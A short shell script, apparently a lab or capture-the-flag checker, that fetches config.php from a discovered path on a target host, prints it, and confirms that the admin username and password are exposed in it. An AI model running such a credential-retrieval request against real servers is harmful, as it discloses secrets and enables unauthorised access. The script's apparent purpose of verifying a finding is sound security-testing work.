#!/bin/sh
# Prove the discovered endpoint leaks the credentials.
set -eu
p="${BOX_PATH:?BOX_PATH is not set}"
p="${p#/}"; p="${p%/}"

body=$(curl -fsS "http://${BOX_HOST}/$p/config.php")
echo "$body"
echo "$body" | grep -q "${BOX_ADMIN_USER}" || { echo "admin user missing" >&2; exit 1; }
echo "$body" | grep -q "${BOX_ADMIN_PASS}" || { echo "admin password missing" >&2; exit 1; }
